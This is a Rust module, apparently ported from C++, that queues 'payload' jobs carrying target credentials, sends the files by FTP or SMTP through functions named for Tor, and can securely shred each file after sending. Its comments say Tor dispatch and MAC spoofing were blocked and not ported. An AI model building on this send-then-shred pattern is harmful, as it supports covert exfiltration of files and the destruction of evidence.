use crate::error::{Result, SdmError};
use crate::file_transfer;
use crate::secure_deletion;
use std::collections::VecDeque;
use std::path::PathBuf;
use std::sync::{Mutex, OnceLock};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PayloadJob {
    pub method: String,
    pub file_path: PathBuf,
    pub remote_name: String,
    pub target: String,
    pub user: String,
    pub password: String,
}

static JOB_QUEUE: OnceLock<Mutex<VecDeque<PayloadJob>>> = OnceLock::new();

fn queue() -> &'static Mutex<VecDeque<PayloadJob>> {
    JOB_QUEUE.get_or_init(|| Mutex::new(VecDeque::new()))
}

/// C++ equivalent: `PayloadDispatcher::queue_payload`.
pub fn queue_payload(job: PayloadJob) {
    queue().lock().expect("payload queue poisoned").push_back(job);
}

/// C++ equivalent: `PayloadDispatcher::dispatch_all`.
///
/// Covert/Tor payload dispatch is blocked. Explicit non-Tor upload/download
/// paths should use `file_transfer` directly.
pub fn dispatch_all(use_tor: bool, spoof_mac: bool, shred_after: bool) -> Vec<Result<()>> {
    let mut results = Vec::new();
    while let Some(job) = queue().lock().expect("payload queue poisoned").pop_front() {
        if use_tor || spoof_mac {
            results.push(Err(SdmError::Blocked("Tor dispatch and MAC spoofing dispatch were not ported")));
            continue;
        }

        let result = match job.method.as_str() {
            "ftp" => file_transfer::send_via_ftp_tor(&job.file_path, &job.target, &job.user, &job.password, &job.remote_name),
            "smtp" => file_transfer::send_via_smtp_tor(&job.file_path, &job.target, &job.user, &job.password, &job.remote_name),
            _ => Err(SdmError::InvalidInput(format!("unknown payload method: {}", job.method))),
        };

        if shred_after && result.is_ok() {
            let _ = secure_deletion::shred_file_simd_pattern(&job.file_path, 3);
        }
        results.push(result);
    }
    results
}
